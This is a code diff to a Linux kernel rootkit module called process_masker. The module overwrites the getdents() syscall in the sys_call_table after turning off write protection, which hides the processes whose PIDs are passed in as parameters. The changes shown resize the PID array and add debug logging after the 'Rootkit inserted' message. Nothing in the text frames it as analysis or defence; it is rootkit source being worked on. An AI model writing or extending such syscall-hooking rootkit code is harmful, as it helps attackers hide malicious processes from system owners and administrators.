@@ -27,12 +27,11 @@
 #include "process_masker.h"   /* Needed for struct linux_dirent */
 #include "sysmap.h"   /* Needed for ROOTKIT_SYS_CALL_TABLE */
 
-
 MODULE_LICENSE("GPL");
 
-static int pids[8] = { -1, -1, -1, -1, -1, -1, -1, -1 };
+static int pids[PIDS_BUFFSIZE];
 static int pids_count = 0;
-module_param_array(pids, int, &pids_count, 0);
+module_param_array(pids, int, &pids_count, 0);   // TODO: edit the permission bits (last argument)
 
 
 void **sys_call_table;
@@ -96,6 +95,8 @@ void enable_write_protect_mode(void)
    insmoded into the kernel. It replaces the getdents() syscall. */
 static int __init process_masker_start(void)
 {
+	int i;
+
 	disable_write_protect_mode();
 
 	/* Store original getdents() syscall */
@@ -109,6 +110,10 @@ static int __init process_masker_start(void)
 	enable_write_protect_mode();
 
 	printk(KERN_INFO "%s\n", "Rootkit inserted");
+
+	printk(KERN_INFO "pids_count: %d\n", pids_count);
+	for (i=0 ; i<PIDS_BUFFSIZE ; i++)
+		printk(KERN_INFO "pids[%d]: %d\n", i, pids[i]);
 
 	/* A non 0 return value means init_module failed; module can't be loaded */
 	return 0;
